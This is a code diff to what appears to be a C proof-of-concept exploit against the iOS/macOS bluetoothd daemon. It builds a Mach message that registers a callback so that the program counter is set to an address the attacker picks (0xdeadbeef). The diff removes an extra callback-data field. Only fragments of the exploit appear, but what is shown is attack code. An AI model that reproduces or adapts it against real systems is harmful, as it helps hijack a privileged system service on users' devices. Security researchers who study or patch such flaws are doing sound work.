@@ -27,11 +27,9 @@ extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name,
 #define ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET 0x20
 #define ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET 0x20
 #define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET 0x28
-#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA 0x40
 
 
 #define CALLBACK_ADDRESS 0xdeadbeef // address PC will be set to
-#define CALLBACK_ADDITIONAL_DATA 0x13371337
 
 typedef unsigned int mach_msg_return_value;
 
@@ -101,7 +99,6 @@ mach_msg_return_value BTAccessory_manager_add_callbacks(mach_port_t bluetoothd_p
     
     *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
     *((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
-    *((long *)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA)) = additional_data;
     
     message->msgh_bits = 0x1513 ;
     
